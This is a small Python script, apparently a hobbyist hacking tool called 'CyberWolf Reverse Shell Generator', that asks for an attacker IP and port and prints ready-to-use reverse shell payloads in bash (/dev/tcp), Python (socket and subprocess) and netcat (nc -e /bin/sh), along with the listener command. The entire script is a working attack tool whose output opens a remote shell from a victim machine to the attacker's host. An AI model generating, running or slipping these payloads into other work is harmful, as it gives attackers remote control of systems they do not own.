#!/usr/bin/env python3
"""🐺 CYBERWOLF REVERSE SHELL GENERATOR"""

print("\n🐺 CyberWolf Reverse Shell Generator")
print("="*50)

lhost = input("📍 Your IP: ")
lport = input("🎯 Your Port: ")

print(f"\n💀 Reverse Shell Payloads:\n")

# Bash
print("🐧 Bash:")
print(f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\n")

# Python
print("🐍 Python:")
print(f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'\n")

# Netcat
print("💀 Netcat:")
print(f"nc -e /bin/sh {lhost} {lport}\n")

print("🐺 Start listener: nc -lvnp", lport)
